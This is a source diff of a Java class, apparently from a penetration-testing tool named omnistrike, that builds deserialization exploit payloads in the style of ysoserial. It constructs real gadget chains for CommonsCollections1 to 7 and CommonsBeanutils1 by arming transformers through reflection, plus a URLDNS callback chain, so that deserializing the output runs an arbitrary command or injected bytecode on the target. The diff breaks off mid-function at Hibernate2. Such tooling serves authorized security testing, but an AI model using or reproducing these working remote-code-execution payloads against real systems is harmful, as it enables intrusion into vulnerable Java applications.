@@ -1,20 +1,41 @@
 package com.omnistrike.modules.injection.deser;
 
 import java.io.*;
+import java.lang.reflect.*;
+import java.math.BigInteger;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
+import java.lang.reflect.Field;
+import java.rmi.registry.Registry;
+import java.rmi.server.ObjID;
+import java.rmi.server.RemoteObjectInvocationHandler;
+import java.rmi.server.RemoteRef;
 import java.util.*;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+import javax.xml.transform.Templates;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.beanutils.BeanComparator;
 
 /**
  * Java deserialization payload generators — comprehensive ysoserial coverage.
  *
- * URLDNS is fully native (HashMap + URL, zero external deps).
- * Other chains use serialized stream templates with command placeholders
- * and require vulnerable libraries on the target classpath.
+ * Tier 1 chains (CC1-CC7, CB1) construct REAL Java objects using the actual
+ * vulnerable library classes, wire them via reflection, and serialize with
+ * ObjectOutputStream. These produce structurally valid serialized streams.
  *
- * 34 chains covering all major ysoserial gadgets plus extras.
+ * Tier 2 chains (Jdk7u21, JRMPClient, JRMPListener) use JDK-only classes.
+ *
+ * Tier 3 chains (Spring, Hibernate, etc.) require libraries not bundled here;
+ * they throw UnsupportedOperationException with guidance to use ysoserial CLI.
+ *
+ * URLDNS is fully native (HashMap + URL, zero external deps).
  */
 public final class JavaPayloads {
 
@@ -27,16 +48,14 @@ public final class JavaPayloads {
         chains.put("URLDNS", "DNS lookup via HashMap+URL — no deps, safe recon (Command = callback URL/domain)");
         chains.put("DNSCallback", "DNS-only callback — alias for URLDNS (Command = callback URL/domain)");
 
-        // ── Commons Collections 3.x chains ─────────────────────────────────
+        // ── Commons Collections chains (ascending order) ─────────────────────
         chains.put("CommonsCollections1", "LazyMap+ChainedTransformer+InvokerTransformer → Runtime.exec (CC 3.1, JDK<8u72)");
+        chains.put("CommonsCollections2", "PriorityQueue+TransformingComparator+InvokerTransformer → Runtime.exec (CC 4.0)");
         chains.put("CommonsCollections3", "LazyMap+ChainedTransformer+InstantiateTransformer+TrAXFilter → Runtime.exec (CC 3.1, JDK<8u72)");
+        chains.put("CommonsCollections4", "PriorityQueue+TransformingComparator+InstantiateTransformer+TrAXFilter → Runtime.exec (CC 4.0)");
         chains.put("CommonsCollections5", "BadAttributeValueExpException+TiedMapEntry+LazyMap → Runtime.exec (CC 3.1)");
         chains.put("CommonsCollections6", "HashSet+TiedMapEntry+LazyMap → Runtime.exec (CC 3.1)");
         chains.put("CommonsCollections7", "Hashtable+LazyMap collision → Runtime.exec (CC 3.1)");
-
-        // ── Commons Collections 4.x chains ─────────────────────────────────
-        chains.put("CommonsCollections2", "PriorityQueue+TransformingComparator+InvokerTransformer → Runtime.exec (CC 4.0)");
-        chains.put("CommonsCollections4", "PriorityQueue+TransformingComparator+InstantiateTransformer+TrAXFilter → Runtime.exec (CC 4.0)");
 
         // ── Commons Beanutils ───────────────────────────────────────────────
         chains.put("CommonsBeanutils1", "PriorityQueue+BeanComparator → Runtime.exec (commons-beanutils 1.x + CC)");
@@ -111,372 +130,449 @@ public final class JavaPayloads {
     }
 
     public static byte[] generate(String chain, String command) {
-        return switch (chain) {
-            // DNS / safe
-            case "URLDNS", "DNSCallback"     -> generateUrldns(command);
+        try {
+            return switch (chain) {
+                // DNS / safe
+                case "URLDNS", "DNSCallback"     -> generateUrldns(command);
 
-            // Commons Collections 3.x
-            case "CommonsCollections1"        -> generateCC1(command);
-            case "CommonsCollections3"        -> generateCC3(command);
-            case "CommonsCollections5"        -> generateCC5(command);
-            case "CommonsCollections6"        -> generateCC6(command);
-            case "CommonsCollections7"        -> generateCC7(command);
+                // Commons Collections 3.x — real object construction
+                case "CommonsCollections1"        -> generateCC1(command);
+                case "CommonsCollections3"        -> generateCC3(command);
+                case "CommonsCollections5"        -> generateCC5(command);
+                case "CommonsCollections6"        -> generateCC6(command);
+                case "CommonsCollections7"        -> generateCC7(command);
 
-            // Commons Collections 4.x
-            case "CommonsCollections2"        -> generateCC2(command);
-            case "CommonsCollections4"        -> generateCC4(command);
+                // Commons Collections 4.x — real object construction
+                case "CommonsCollections2"        -> generateCC2(command);
+                case "CommonsCollections4"        -> generateCC4(command);
 
-            // Commons Beanutils
-            case "CommonsBeanutils1"          -> generateCB1(command);
-            case "CommonsBeanutils1_183"      -> generateCB1_183(command);
+                // Commons Beanutils — real object construction
+                case "CommonsBeanutils1"          -> generateCB1(command);
+                case "CommonsBeanutils1_183"      -> generateCB1_183(command);
 
-            // Spring
-            case "Spring1"                    -> generateSpring1(command);
-            case "Spring2"                    -> generateSpring2(command);
+                // JDK built-in — real object construction
+                case "Jdk7u21"                    -> generateJdk7u21(command);
 
-            // Hibernate
-            case "Hibernate1"                 -> generateHibernate1(command);
-            case "Hibernate2"                 -> generateHibernate2(command);
+                // JRMP — real object construction
+                case "JRMPClient"                 -> generateJRMPClient(command);
+                case "JRMPListener"               -> generateJRMPListener(command);
 
-            // Groovy
-            case "Groovy1"                    -> generateGroovy1(command);
+                // Tier 3 — require libraries not bundled
+                case "Spring1"                    -> unsupported(chain, "Spring Framework");
+                case "Spring2"                    -> unsupported(chain, "Spring AOP");
+                case "Hibernate1"                 -> unsupported(chain, "Hibernate 5");
+                case "Hibernate2"                 -> unsupported(chain, "Hibernate 5");
+                case "Groovy1"                    -> unsupported(chain, "Groovy 2.3-2.4");
+                case "JNDIExploit"                -> unsupported(chain, "JNDI (use JRMPClient for similar effect)");
+                case "ROME"                       -> unsupported(chain, "ROME 1.0");
+                case "BeanShell1"                 -> unsupported(chain, "BeanShell 2.0b5");
+                case "C3P0"                       -> unsupported(chain, "C3P0");
+                case "Click1"                     -> unsupported(chain, "Apache Click 2.3");
+                case "FileUpload1"                -> unsupported(chain, "commons-fileupload 1.3.1");
+                case "JBossInterceptors1"         -> unsupported(chain, "JBoss Interceptors");
+                case "JavassistWeld1"             -> unsupported(chain, "Weld CDI");
+                case "JSON1"                      -> unsupported(chain, "Spring + json-lib");
+                case "Jython1"                    -> unsupported(chain, "Jython 2.5-2.7");
+                case "MozillaRhino1"              -> unsupported(chain, "Mozilla Rhino 1.7r2");
+                case "MozillaRhino2"              -> unsupported(chain, "Mozilla Rhino 1.7r2");
+                case "Myfaces1"                   -> unsupported(chain, "MyFaces 1.2-2.x");
+                case "Myfaces2"                   -> unsupported(chain, "MyFaces 2.x");
+                case "Vaadin1"                    -> unsupported(chain, "Vaadin 7.x");
+                case "Wicket1"                    -> unsupported(chain, "Wicket commons-fileupload");
+                case "Clojure"                    -> unsupported(chain, "Clojure 1.2+");
 
-            // JDK
-            case "Jdk7u21"                    -> generateJdk7u21(command);
+                default -> throw new IllegalArgumentException("Unknown Java chain: " + chain);
+            };
+        } catch (UnsupportedOperationException e) {
+            throw e;
+        } catch (Exception e) {
+            throw new RuntimeException(chain + " generation failed: " + e.getMessage(), e);
+        }
+    }
 
-            // JRMP
-            case "JRMPClient"                 -> generateJRMPClient(command);
-            case "JRMPListener"               -> generateJRMPListener(command);
-
-            // JNDI
-            case "JNDIExploit"                -> generateJndi(command);
-
-            // ROME
-            case "ROME"                       -> generateROME(command);
-
-            // BeanShell
-            case "BeanShell1"                 -> generateBeanShell1(command);
-
-            // C3P0
-            case "C3P0"                       -> generateC3P0(command);
-
-            // Click
-            case "Click1"                     -> generateClick1(command);
-
-            // FileUpload
-            case "FileUpload1"                -> generateFileUpload1(command);
-
-            // JBoss
-            case "JBossInterceptors1"         -> generateJBossInterceptors1(command);
-
-            // Javassist/Weld
-            case "JavassistWeld1"             -> generateJavassistWeld1(command);
-
-            // JSON/Spring
-            case "JSON1"                      -> generateJSON1(command);
-
-            // Jython
-            case "Jython1"                    -> generateJython1(command);
-
-            // Rhino
-            case "MozillaRhino1"              -> generateMozillaRhino1(command);
-            case "MozillaRhino2"              -> generateMozillaRhino2(command);
-
-            // MyFaces
-            case "Myfaces1"                   -> generateMyfaces1(command);
-            case "Myfaces2"                   -> generateMyfaces2(command);
-
-            // Vaadin
-            case "Vaadin1"                    -> generateVaadin1(command);
-
-            // Wicket
-            case "Wicket1"                    -> generateWicket1(command);
-
-            // Clojure
-            case "Clojure"                    -> generateClojure(command);
-
-            default -> throw new IllegalArgumentException("Unknown Java chain: " + chain);
-        };
+    private static byte[] unsupported(String chain, String library) {
+        throw new UnsupportedOperationException(
+                "Chain '" + chain + "' requires " + library +
+                " on classpath — use ysoserial CLI for this chain");
     }
 
     // ════════════════════════════════════════════════════════════════════════
     //  URLDNS — Fully native, zero dependencies
     // ════════════════════════════════════════════════════════════════════════
 
-    /**
-     * URLDNS chain — fully native, zero dependencies.
-     * Triggers a DNS lookup on deserialization.
-     * Uses HashMap + URL, exploiting URL.hashCode() → getHostAddress().
-     *
-     * Implementation: serialize HashMap normally, then binary-patch the URL's
-     * hashCode field from its computed value to -1 (0xFFFFFFFF) in the byte
-     * stream. On deserialization the target sees hashCode == -1, forcing
-     * URL.hashCode() to call getHostAddress() → DNS lookup.
-     */
-    private static byte[] generateUrldns(String callbackUrl) {
-        try {
-            String target = toValidUrl(callbackUrl);
-            URL url = new URL(target);
+    private static byte[] generateUrldns(String callbackUrl) throws Exception {
+        String target = toValidUrl(callbackUrl);
+        URL url = new URL(target);
 
-            int computedHash = url.hashCode();
+        // Prevent DNS during put() — set hashCode to any value != -1
+        java.lang.reflect.Field hashCodeField = URL.class.getDeclaredField("hashCode");
+        hashCodeField.setAccessible(true);
+        hashCodeField.setInt(url, 0xCAFE);
 
-            HashMap<URL, String> hashMap = new HashMap<>();
-            hashMap.put(url, "omnistrike");
+        HashMap<URL, String> hashMap = new HashMap<>();
+        hashMap.put(url, "omnistrike");
 
-            ByteArrayOutputStream bos = new ByteArrayOutputStream();
-            try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
-                oos.writeObject(hashMap);
-            }
-            byte[] serialized = bos.toByteArray();
+        // Reset to -1 so deserialization triggers hashCode() → DNS lookup
+        hashCodeField.setInt(url, -1);
 
-            // Binary-patch: find URL's hashCode int and set to -1
-            byte[] urlClassNameBytes = "java.net.URL".getBytes(StandardCharsets.UTF_8);
-            int classNamePos = indexOf(serialized, urlClassNameBytes, 0);
-
-            if (classNamePos < 0) {
-                throw new IllegalStateException("Could not locate java.net.URL in serialized stream");
-            }
-
-            int port = url.getPort();
-            byte[] searchPattern = new byte[]{
-                (byte) (computedHash >> 24), (byte) (computedHash >> 16),
-                (byte) (computedHash >> 8),  (byte) computedHash,
-                (byte) (port >> 24), (byte) (port >> 16),
-                (byte) (port >> 8),  (byte) port
-            };
-
-            int patchPos = indexOf(serialized, searchPattern, classNamePos + urlClassNameBytes.length);
-
-            if (patchPos >= 0) {
-                serialized[patchPos]     = (byte) 0xFF;
-                serialized[patchPos + 1] = (byte) 0xFF;
-                serialized[patchPos + 2] = (byte) 0xFF;
-                serialized[patchPos + 3] = (byte) 0xFF;
-            } else {
-                byte[] hashOnly = new byte[]{
-                    (byte) (computedHash >> 24), (byte) (computedHash >> 16),
-                    (byte) (computedHash >> 8),  (byte) computedHash
-                };
-                patchPos = indexOf(serialized, hashOnly, classNamePos + urlClassNameBytes.length);
-                if (patchPos >= 0) {
-                    serialized[patchPos]     = (byte) 0xFF;
-                    serialized[patchPos + 1] = (byte) 0xFF;
-                    serialized[patchPos + 2] = (byte) 0xFF;
-                    serialized[patchPos + 3] = (byte) 0xFF;
-                }
-            }
-
-            return serialized;
-        } catch (Exception e) {
-            throw new RuntimeException("URLDNS generation failed: " + e.getMessage(), e);
-        }
+        return ReflectionUtils.serialize(hashMap);
     }
 
     // ════════════════════════════════════════════════════════════════════════
     //  Commons Collections 3.x chains (require commons-collections 3.1)
     // ════════════════════════════════════════════════════════════════════════
 
-    /** CC1: LazyMap + ChainedTransformer + InvokerTransformer (CC 3.1, JDK < 8u72) */
-    private static byte[] generateCC1(String command) {
-        return buildStreamTemplate("CommonsCollections1", command,
-            "aced0005" +
-            "7372001d6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e" +
-            "6d61702e4c617a794d617000000000000000000200014c0007666163746f72797400" +
-            "2c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f54" +
-            "72616e73666f726d65723b"
-        );
+    /**
+     * CC1: AnnotationInvocationHandler proxy → LazyMap → ChainedTransformer → InvokerTransformer chain.
+     * Requires CC 3.1 and JDK < 8u72 (AnnotationInvocationHandler patched in 8u72).
+     *
+     * Deferred arming: build with inert chain, wire objects, then swap in real transformers.
+     */
+    @SuppressWarnings("unchecked")
+    private static byte[] generateCC1(String command) throws Exception {
+        Transformer[] realTransformers = GadgetUtils.makeTransformerChain(command);
+        ChainedTransformer fakeChain = GadgetUtils.makeInertChain();
+
+        Map<String, String> innerMap = new HashMap<>();
+        Map lazyMap = LazyMap.decorate(innerMap, fakeChain);
+
+        // AnnotationInvocationHandler proxy → LazyMap
+        Constructor<?> aihCtor = ReflectionUtils.getFirstCtor(
+                "sun.reflect.annotation.AnnotationInvocationHandler");
+        InvocationHandler aih = (InvocationHandler) aihCtor.newInstance(Override.class, lazyMap);
+
+        Map proxyMap = (Map) Proxy.newProxyInstance(
+                JavaPayloads.class.getClassLoader(), new Class[]{Map.class}, aih);
+
+        // Outer AnnotationInvocationHandler wrapping the proxy
+        InvocationHandler handler = (InvocationHandler) aihCtor.newInstance(Override.class, proxyMap);
+
+        // Arm: swap in real transformer chain
+        ReflectionUtils.setFieldValue(fakeChain, "iTransformers", realTransformers);
+
+        return ReflectionUtils.serialize(handler);
     }
 
-    /** CC3: LazyMap + ChainedTransformer + InstantiateTransformer + TrAXFilter (CC 3.1, JDK < 8u72) */
-    private static byte[] generateCC3(String command) {
-        return buildStreamTemplate("CommonsCollections3", command,
-            "aced0005" +
-            "7372001d6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e" +
-            "6d61702e4c617a794d617000000000000000000200014c0007666163746f72797400" +
-            "2c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f54" +
-            "72616e73666f726d65723b" +
-            "7372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e" +
-            "66756e63746f72732e496e7374616e74696174655472616e73666f726d6572"
-        );
+    /**
+     * CC3: AnnotationInvocationHandler proxy → LazyMap → ChainedTransformer
+     *      → InstantiateTransformer(TrAXFilter) → TemplatesImpl bytecode.
+     * Requires CC 3.1 and JDK < 8u72.
+     */
+    @SuppressWarnings("unchecked")
+    private static byte[] generateCC3(String command) throws Exception {
+        Object templates = GadgetUtils.createTemplatesImpl(command);
+        ChainedTransformer fakeChain = GadgetUtils.makeInertChain();
+
+        Map<String, String> innerMap = new HashMap<>();
+        Map lazyMap = LazyMap.decorate(innerMap, fakeChain);
+
+        Constructor<?> aihCtor = ReflectionUtils.getFirstCtor(
+                "sun.reflect.annotation.AnnotationInvocationHandler");
+        InvocationHandler aih = (InvocationHandler) aihCtor.newInstance(Override.class, lazyMap);
+        Map proxyMap = (Map) Proxy.newProxyInstance(
+                JavaPayloads.class.getClassLoader(), new Class[]{Map.class}, aih);
+        InvocationHandler handler = (InvocationHandler) aihCtor.newInstance(Override.class, proxyMap);
+
+        // Arm: TrAXFilter constructor takes Templates → calls newTransformer() → evil bytecode
+        Class<?> traxFilterClass = Class.forName(
+                "com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
+        Transformer[] realTransformers = new Transformer[]{
+                new ConstantTransformer(traxFilterClass),
+                new InstantiateTransformer(
+                        new Class[]{Templates.class}, new Object[]{templates}),
+                new ConstantTransformer(1)
+        };
+        ReflectionUtils.setFieldValue(fakeChain, "iTransformers", realTransformers);
+
+        return ReflectionUtils.serialize(handler);
     }
 
-    /** CC5: BadAttributeValueExpException + TiedMapEntry + LazyMap (CC 3.1) */
-    private static byte[] generateCC5(String command) {
-        return buildStreamTemplate("CommonsCollections5", command,
-            "aced0005" +
-            "7372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556" +
-            "616c7565457870457863657074696f6e"
-        );
+    /**
+     * CC5: BadAttributeValueExpException → TiedMapEntry → LazyMap → InvokerTransformer chain.
+     * Requires CC 3.1. Works on JDK 8+ (no AnnotationInvocationHandler needed).
+     */
+    @SuppressWarnings("unchecked")
+    private static byte[] generateCC5(String command) throws Exception {
+        Transformer[] realTransformers = GadgetUtils.makeTransformerChain(command);
+        ChainedTransformer fakeChain = GadgetUtils.makeInertChain();
+
+        Map<String, String> innerMap = new HashMap<>();
+        Map lazyMap = LazyMap.decorate(innerMap, fakeChain);
+
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+
+        // BadAttributeValueExpException.readObject → val.toString → TiedMapEntry.toString
+        // → TiedMapEntry.getValue → LazyMap.get → ChainedTransformer
+        javax.management.BadAttributeValueExpException val =
+                new javax.management.BadAttributeValueExpException(null);
+        ReflectionUtils.setFieldValue(val, "val", entry);
+
+        // Arm
+        ReflectionUtils.setFieldValue(fakeChain, "iTransformers", realTransformers);
+
+        return ReflectionUtils.serialize(val);
     }
 
-    /** CC6: HashSet + TiedMapEntry + LazyMap (CC 3.1) */
-    private static byte[] generateCC6(String command) {
-        return buildStreamTemplate("CommonsCollections6", command,
-            "aced0005" +
-            "7372001168617368536574" +
-            "7372002c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e" +
-            "6b657976616c75652e546965644d6170456e747279"
-        );
+    /**
+     * CC6: HashSet → HashMap → TiedMapEntry.hashCode → LazyMap.get → InvokerTransformer chain.
+     * Requires CC 3.1. Works on all JDK versions (no AIH needed).
+     */
+    @SuppressWarnings("unchecked")
+    private static byte[] generateCC6(String command) throws Exception {
+        Transformer[] realTransformers = GadgetUtils.makeTransformerChain(command);
+        ChainedTransformer fakeChain = GadgetUtils.makeInertChain();
+
+        Map<String, String> innerMap = new HashMap<>();
+        Map lazyMap = LazyMap.decorate(innerMap, fakeChain);
+
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+
+        HashSet<Object> set = new HashSet<>(1);
+        set.add("foo");
+
+        // Get HashSet's internal HashMap, then replace the key with our TiedMapEntry
+        Field mapField = HashSet.class.getDeclaredField("map");
+        mapField.setAccessible(true);
+        HashMap<Object, Object> hsMap = (HashMap<Object, Object>) mapField.get(set);
+
+        Field tableField = HashMap.class.getDeclaredField("table");
+        tableField.setAccessible(true);
+        Object[] table = (Object[]) tableField.get(hsMap);
+
+        // Find the non-null node and replace its key
+        for (Object node : table) {
+            if (node != null) {
+                Field keyField = node.getClass().getDeclaredField("key");
+                keyField.setAccessible(true);
+                keyField.set(node, entry);
+                break;
+            }
+        }
+
+        // Arm
+        ReflectionUtils.setFieldValue(fakeChain, "iTransformers", realTransformers);
+
+        return ReflectionUtils.serialize(set);
     }
 
-    /** CC7: Hashtable + LazyMap collision (CC 3.1) */
-    private static byte[] generateCC7(String command) {
-        return buildStreamTemplate("CommonsCollections7", command,
-            "aced0005" +
-            "737200136a6176612e7574696c2e486173687461626c65" +
-            "13bb0f25214ae4b80300024600" +
-            "0a6c6f6164466163746f72490009" +
-            "7468726573686f6c64"
-        );
+    /**
+     * CC7: Hashtable collision ("yy"/"zZ") → LazyMap.equals → LazyMap.get → InvokerTransformer chain.
+     * Requires CC 3.1. Works on all JDK versions.
+     *
+     * "yy" and "zZ" have the same hashCode (3872), causing a hash collision in Hashtable.
+     * During reconstitutionPut, Hashtable calls equals() on the colliding keys,
+     * which triggers LazyMap.get → ChainedTransformer.
+     */
+    @SuppressWarnings("unchecked")
+    private static byte[] generateCC7(String command) throws Exception {
+        Transformer[] realTransformers = GadgetUtils.makeTransformerChain(command);
+        ChainedTransformer fakeChain = GadgetUtils.makeInertChain();
+
+        Map<String, String> innerMap1 = new HashMap<>();
+        Map<String, String> innerMap2 = new HashMap<>();
+        Map lazyMap1 = LazyMap.decorate(innerMap1, fakeChain);
+        Map lazyMap2 = LazyMap.decorate(innerMap2, fakeChain);
+
+        lazyMap1.put("yy", "1");
+        lazyMap2.put("zZ", "1");
+
+        Hashtable<Object, Object> hashtable = new Hashtable<>();
+        hashtable.put(lazyMap1, "1");
+        hashtable.put(lazyMap2, "2");
+
+        // The second put() triggers collision → lazyMap2 gets an extra "yy" entry; remove it
+        lazyMap2.remove("yy");
+
+        // Arm
+        ReflectionUtils.setFieldValue(fakeChain, "iTransformers", realTransformers);
+
+        return ReflectionUtils.serialize(hashtable);
     }
 
     // ════════════════════════════════════════════════════════════════════════
     //  Commons Collections 4.x chains (require commons-collections4 4.0)
     // ════════════════════════════════════════════════════════════════════════
 
-    /** CC2: PriorityQueue + TransformingComparator + InvokerTransformer (CC 4.0) */
-    private static byte[] generateCC2(String command) {
-        return buildStreamTemplate("CommonsCollections2", command,
-            "aced0005" +
-            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
-            "0003000249000473697a65" +
-            "4c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b" +
-            "7372004b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e" +
-            "636f6d70617261746f72732e5472616e73666f726d696e67436f6d70617261746f72"
-        );
+    /**
+     * CC2: PriorityQueue → TransformingComparator → InvokerTransformer("newTransformer")
+     *      → TemplatesImpl bytecode.
+     * Requires CC4 4.0.
+     */
+    private static byte[] generateCC2(String command) throws Exception {
+        Object templates = GadgetUtils.createTemplatesImpl(command);
+
+        // CC4's InvokerTransformer — start with inert "toString"
+        // Raw types — CC4 4.0 generics vary between versions
+        @SuppressWarnings({"unchecked", "rawtypes"})
+        org.apache.commons.collections4.functors.InvokerTransformer invoker =
+                new org.apache.commons.collections4.functors.InvokerTransformer(
+                        "toString", new Class[0], new Object[0]);
+
+        @SuppressWarnings({"unchecked", "rawtypes"})
+        org.apache.commons.collections4.comparators.TransformingComparator comp =
+                new org.apache.commons.collections4.comparators.TransformingComparator(invoker);
+
+        PriorityQueue<Object> queue = new PriorityQueue<>(2, comp);
+        queue.add(1);
+        queue.add(1);
+
+        // Arm: swap queue contents and transformer method
+        ReflectionUtils.setFieldValue(invoker, "iMethodName", "newTransformer");
+        Object[] queueArray = (Object[]) ReflectionUtils.getFieldValue(queue, "queue");
+        queueArray[0] = templates;
+        queueArray[1] = 1;
+
+        return ReflectionUtils.serialize(queue);
     }
 
-    /** CC4: PriorityQueue + TransformingComparator + InstantiateTransformer + TrAXFilter (CC 4.0) */
-    private static byte[] generateCC4(String command) {
-        return buildStreamTemplate("CommonsCollections4", command,
-            "aced0005" +
-            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
-            "0003000249000473697a65" +
-            "4c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b" +
-            "7372004b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e" +
-            "636f6d70617261746f72732e5472616e73666f726d696e67436f6d70617261746f72" +
-            "7372003f6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73342e" +
-            "66756e63746f72732e496e7374616e74696174655472616e73666f726d6572"
-        );
+    /**
+     * CC4: PriorityQueue → TransformingComparator → ChainedTransformer
+     *      → [ConstantTransformer(TrAXFilter) + InstantiateTransformer(Templates)] → TemplatesImpl.
+     * Requires CC4 4.0.
+     */
+    @SuppressWarnings({"unchecked", "rawtypes"})
+    private static byte[] generateCC4(String command) throws Exception {
+        Object templates = GadgetUtils.createTemplatesImpl(command);
+        Class<?> traxFilterClass = Class.forName(
+                "com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
+
+        // Phase 1: Use a throwaway inert transformer for safe queue population.
+        // ConstantTransformer("1") returns a Comparable String so compare() works.
+        org.apache.commons.collections4.functors.ConstantTransformer inert =
+                new org.apache.commons.collections4.functors.ConstantTransformer("1");
+
+        org.apache.commons.collections4.comparators.TransformingComparator comp =
+                new org.apache.commons.collections4.comparators.TransformingComparator(inert);
+
+        PriorityQueue<Object> queue = new PriorityQueue<>(2, comp);
+        queue.add(1);
+        queue.add(1);
+
+        // Phase 2: Build the real chain with FRESH objects (no shared refs with inert).
+        // On deserialization: ConstantTransformer(TrAXFilter.class) ignores queue element,
+        // returns TrAXFilter.class → InstantiateTransformer creates new TrAXFilter(templates)
+        // → TrAXFilter constructor calls templates.newTransformer() → evil bytecode runs.
+        org.apache.commons.collections4.functors.ConstantTransformer constant =
+                new org.apache.commons.collections4.functors.ConstantTransformer(traxFilterClass);
+
+        org.apache.commons.collections4.functors.InstantiateTransformer instantiate =
+                new org.apache.commons.collections4.functors.InstantiateTransformer(
+                        new Class[]{Templates.class}, new Object[]{templates});
+
+        org.apache.commons.collections4.functors.ChainedTransformer realChain =
+                new org.apache.commons.collections4.functors.ChainedTransformer(
+                        new org.apache.commons.collections4.Transformer[]{constant, instantiate});
+
+        // Phase 3: Arm — swap comparator's transformer to real chain.
+        // Queue elements stay as Integer(1) — ConstantTransformer ignores them.
+        ReflectionUtils.setFieldValue(comp, "transformer", realChain);
+
+        return ReflectionUtils.serialize(queue);
     }
 
     // ════════════════════════════════════════════════════════════════════════
     //  Commons Beanutils
     // ════════════════════════════════════════════════════════════════════════
 
-    /** CB1: PriorityQueue + BeanComparator (commons-beanutils 1.x + commons-collections) */
-    private static byte[] generateCB1(String command) {
-        return buildStreamTemplate("CommonsBeanutils1", command,
-            "aced0005" +
-            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
-            "0003000249000473697a65" +
-            "4c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b" +
-            "737200426f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e" +
-            "436f6d70617261746f72"
-        );
+    /**
+     * CB1: PriorityQueue → BeanComparator("outputProperties") → TemplatesImpl.
+     * Requires commons-beanutils 1.x + commons-collections on classpath.
+     *
+     * BeanComparator calls PropertyUtils.getProperty(obj, "outputProperties")
+     * → TemplatesImpl.getOutputProperties() → newTransformer() → evil bytecode.
+     */
+    private static byte[] generateCB1(String command) throws Exception {
+        Object templates = GadgetUtils.createTemplatesImpl(command);
+
+        // Use "lowestSetBit" as inert property (BigInteger has this getter)
+        BeanComparator<Object> comparator = new BeanComparator<>("lowestSetBit");
+
+        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
+        queue.add(new BigInteger("1"));
+        queue.add(new BigInteger("1"));
+
+        // Arm: swap property to "outputProperties" and queue contents to TemplatesImpl
+        ReflectionUtils.setFieldValue(comparator, "property", "outputProperties");
+        ReflectionUtils.setFieldValue(queue, "queue", new Object[]{templates, templates});
+
+        return ReflectionUtils.serialize(queue);
     }
 
-    /** CB1_183: PriorityQueue + BeanComparator (commons-beanutils 1.8.3+, no CC dependency) */
-    private static byte[] generateCB1_183(String command) {
-        return buildStreamTemplate("CommonsBeanutils1_183", command,
-            "aced0005" +
-            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
-            "0003000249000473697a65" +
-            "4c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b" +
-            "737200426f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e" +
-            "436f6d70617261746f72" +
-            "0000000000000000020000"
-        );
-    }
+    /**
+     * CB1_183: Same as CB1 but uses an explicit java.util Comparator instead of
+     * CC's ComparableComparator, so it works without commons-collections on classpath.
+     */
+    private static byte[] generateCB1_183(String command) throws Exception {
+        Object templates = GadgetUtils.createTemplatesImpl(command);
 
-    // ════════════════════════════════════════════════════════════════════════
-    //  Spring Framework
-    // ════════════════════════════════════════════════════════════════════════
+        // Provide an explicit Comparator to avoid CC dependency
+        BeanComparator<Object> comparator = new BeanComparator<>(null,
+                String.CASE_INSENSITIVE_ORDER);
 
-    /** Spring1: SerializableTypeWrapper + ObjectFactoryDelegatingInvocationHandler */
-    private static byte[] generateSpring1(String command) {
-        return buildStreamTemplate("Spring1", command,
-            "aced0005" +
-            "737200476f72672e737072696e676672616d65776f726b2e636f72652e53657269616c697a" +
-            "61626c655479706557726170706572245479706550726f766964657253657269616c697a" +
-            "6174696f6e48656c706572"
-        );
-    }
+        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
+        queue.add("a");
+        queue.add("b");
 
-    /** Spring2: JdkDynamicAopProxy + AnnotationInvocationHandler (Spring AOP, JDK < 8u72) */
-    private static byte[] generateSpring2(String command) {
-        return buildStreamTemplate("Spring2", command,
-            "aced0005" +
-            "737200376f72672e737072696e676672616d65776f726b2e616f702e6672616d65776f726b" +
-            "2e4a646b44796e616d6963416f7050726f7879"
-        );
-    }
+        // Arm
+        ReflectionUtils.setFieldValue(comparator, "property", "outputProperties");
+        ReflectionUtils.setFieldValue(queue, "queue", new Object[]{templates, templates});
 
-    // ════════════════════════════════════════════════════════════════════════
-    //  Hibernate
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** Hibernate1: HashMap + BasicLazyInitializer + AbstractComponentTuplizer */
-    private static byte[] generateHibernate1(String command) {
-        return buildStreamTemplate("Hibernate1", command,
-            "aced0005" +
-            "737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246" +
-            "0010006c6f6164466163746f72490009" +
-            "7468726573686f6c64" +
-            "737200366f72672e68696265726e6174652e70726f78792e706f6a6f2e42617369634c617a79" +
-            "496e697469616c697a6572"
-        );
-    }
-
-    /** Hibernate2: HashMap + BasicLazyInitializer + PojoComponentTuplizer (alt trigger) */
-    private static byte[] generateHibernate2(String command) {
-        return buildStreamTemplate("Hibernate2", command,
